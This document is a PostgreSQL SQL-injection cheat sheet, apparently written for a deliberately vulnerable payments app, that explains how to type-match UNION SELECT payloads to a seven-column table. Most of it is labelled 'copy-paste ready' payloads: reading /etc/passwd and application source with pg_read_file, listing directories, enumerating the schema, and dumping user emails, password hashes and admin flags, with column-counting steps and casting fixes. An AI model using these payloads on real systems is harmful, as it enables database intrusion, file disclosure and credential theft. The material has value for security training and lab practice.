# 🔧 PostgreSQL Type Matching Cheat Sheet

## ⚠️ The Problem

When you try a basic UNION SELECT like this:
```sql
?id=1 UNION SELECT 1,2,3,4,5,6,7
```

You get this error:
```
UNION types character varying and integer cannot be matched
```

**Why?** PostgreSQL requires EXACT type matching in UNION queries!

---

## 📊 Payments Table Schema (Target for Injection)

```sql
CREATE TABLE payments (
    id SERIAL PRIMARY KEY,                  -- Column 1: INTEGER
    user_id INTEGER NOT NULL,               -- Column 2: INTEGER  
    recipient VARCHAR(120) NOT NULL,        -- Column 3: VARCHAR (string)
    amount DECIMAL(10, 2) NOT NULL,         -- Column 4: DECIMAL (0.00)
    description TEXT,                       -- Column 5: TEXT (string)
    status VARCHAR(20) DEFAULT 'completed', -- Column 6: VARCHAR (string)
    created_at TIMESTAMP                    -- Column 7: TIMESTAMP
);
```

---

## ✅ The Solution: Match Types Exactly

### Template for All UNION Payloads
```sql
UNION SELECT 
    <integer>,              -- Column 1: id
    <integer>,              -- Column 2: user_id
    '<string>',             -- Column 3: recipient (varchar)
    0.00,                   -- Column 4: amount (decimal)
    '<longer text>',        -- Column 5: description (text)
    '<string>',             -- Column 6: status (varchar)
    CURRENT_TIMESTAMP       -- Column 7: created_at (timestamp)
```

### Example: Basic Test
```sql
?id=1 UNION SELECT 1, 2, 'test', 0.00, 'description', 'status', CURRENT_TIMESTAMP
```

---

## 🔥 Working Payloads (Copy-Paste Ready)

### Get PostgreSQL Version
```
?id=1 UNION SELECT 1, 2, version(), 0.00, 'Database version info', 'info', CURRENT_TIMESTAMP
```

### Read /etc/passwd
```
?id=1 UNION SELECT 1, 2, '/etc/passwd', 0.00, pg_read_file('/etc/passwd'), 'file', CURRENT_TIMESTAMP
```

### Read Application Source
```
?id=1 UNION SELECT 1, 2, 'app.py', 0.00, pg_read_file('/app/app.py'), 'source', CURRENT_TIMESTAMP
```

### List Directory Contents
```
?id=1 UNION SELECT 1, 2, pg_ls_dir('/app'), 0.00, 'Application directory file', 'dir', CURRENT_TIMESTAMP
```

**Result**: Shows all files in /app (one per row)

### List All Tables
```
?id=1 UNION SELECT 1, 2, table_name, 0.00, table_schema, 'table', CURRENT_TIMESTAMP FROM information_schema.tables WHERE table_schema='public'
```

### List Columns in a Table
```
?id=1 UNION SELECT 1, 2, column_name, 0.00, data_type, is_nullable, CURRENT_TIMESTAMP FROM information_schema.columns WHERE table_name='users'
```

### Extract Admin User
```
?id=1 UNION SELECT id, id, username, 0.00, CONCAT('Email: ', email, ' | Hash: ', password_hash), 'ADMIN', created_at FROM users WHERE is_admin=TRUE
```

### Extract All Users
```
?id=1 UNION SELECT id, id, username, 0.00, CONCAT(email, ' | ', password_hash, ' | Admin: ', is_admin::text), full_name, created_at FROM users
```

### Count Users
```
?id=1 UNION SELECT 1, 2, 'Total users:', COUNT(*)::decimal, 'Result shows user count', 'count', CURRENT_TIMESTAMP FROM users
```

---

## 🎓 Type Casting Reference

PostgreSQL uses `::type` for explicit casting:

| Original Type | Cast To | Syntax |
|--------------|---------|--------|
| INTEGER | TEXT | `id::text` |
| BOOLEAN | TEXT | `is_admin::text` |
| TIMESTAMP | TEXT | `created_at::text` |
| DECIMAL | TEXT | `amount::text` |
| INTEGER | DECIMAL | `COUNT(*)::decimal` |
| TEXT | VARCHAR | `'text'::varchar` |

### Example: When Extracting from Users Table
```sql
-- Users table has: id, username, email, password_hash, full_name, is_admin, created_at
-- Payments needs: int, int, varchar, decimal, text, varchar, timestamp

SELECT 
    id,                     -- INTEGER → matches payments.id
    id,                     -- INTEGER → matches payments.user_id
    username,               -- VARCHAR → matches payments.recipient
    0.00,                   -- DECIMAL → matches payments.amount
    password_hash,          -- TEXT → matches payments.description
    is_admin::text,         -- BOOLEAN→VARCHAR via ::text
    created_at              -- TIMESTAMP → matches payments.created_at
FROM users
```

---

## 🐛 Common Errors and Fixes

### Error: "UNION types character varying and integer cannot be matched"
**Problem**: You used an integer where a string is expected (or vice versa)

**Fix**: Check your column order and types:
```sql
-- ❌ WRONG (integer in string position)
UNION SELECT 1, 2, 3, 4, 5, 6, 7

-- ✅ CORRECT (strings in string positions)
UNION SELECT 1, 2, 'string', 0.00, 'text', 'string', CURRENT_TIMESTAMP
```

### Error: "UNION types numeric and timestamp cannot be matched"
**Problem**: Type mismatch in timestamp column

**Fix**: Use `CURRENT_TIMESTAMP` or cast to timestamp:
```sql
-- ❌ WRONG
UNION SELECT 1, 2, 'test', 0.00, 'desc', 'status', 'text'

-- ✅ CORRECT
UNION SELECT 1, 2, 'test', 0.00, 'desc', 'status', CURRENT_TIMESTAMP
```

### Error: "column has type boolean but expression is of type text"
**Problem**: Boolean column needs explicit cast

**Fix**: Use `::text` to cast:
```sql
-- ❌ WRONG
SELECT is_admin FROM users

-- ✅ CORRECT (when mapping to varchar column)
SELECT is_admin::text FROM users
```

---

## 💡 Pro Tips

### 1. Use CONCAT() to Pack Multiple Values
```sql
-- Pack multiple columns into the description field
CONCAT('Email: ', email, ' | Hash: ', password_hash, ' | Admin: ', is_admin::text)
```

### 2. Use Decimal 0.00 as Placeholder
```sql
-- When you don't care about the amount field
... 0.00 ...
```

### 3. Use CURRENT_TIMESTAMP for Timestamp Fields
```sql
-- Always works for timestamp columns
... CURRENT_TIMESTAMP
```

### 4. Map Extracted Data Cleverly
```sql
-- Put interesting data in the 'description' column (TEXT type)
-- It's displayed prominently and can hold large content
... pg_read_file('/etc/passwd') ...  -- Goes in description column
```

---

## 📋 Quick Reference Table

| Position | Column Name | Type | Your Payload Should Use |
|----------|------------|------|------------------------|
| 1 | id | INTEGER | Any integer like `1` |
| 2 | user_id | INTEGER | Any integer like `2` |
| 3 | recipient | VARCHAR | Any string in quotes like `'test'` |
| 4 | amount | DECIMAL | Decimal number like `0.00` or `99.99` |
| 5 | description | TEXT | String for data like `pg_read_file(...)` |
| 6 | status | VARCHAR | Short string like `'status'` |
| 7 | created_at | TIMESTAMP | `CURRENT_TIMESTAMP` or cast |

---

## 🎯 Testing Your Payload

**Step 1**: Verify column count with ORDER BY
```
?id=1 ORDER BY 7  -- Works (7 columns)
?id=1 ORDER BY 8  -- Error (only 7 columns)
```

**Step 2**: Test with simple values
```
?id=1 UNION SELECT 1, 2, 'a', 0.00, 'b', 'c', CURRENT_TIMESTAMP
```

**Step 3**: Replace dummy values with real queries
```
?id=1 UNION SELECT 1, 2, version(), 0.00, 'version info', 'data', CURRENT_TIMESTAMP
```

---

## 🔗 Full Documentation

See **[POSTGRES_SQLI_PAYLOADS.md](docs/POSTGRES_SQLI_PAYLOADS.md)** for complete guide with 30+ payloads!

---

**Remember**: PostgreSQL is strict about types, but this also makes it more predictable once you understand the schema! 🎓
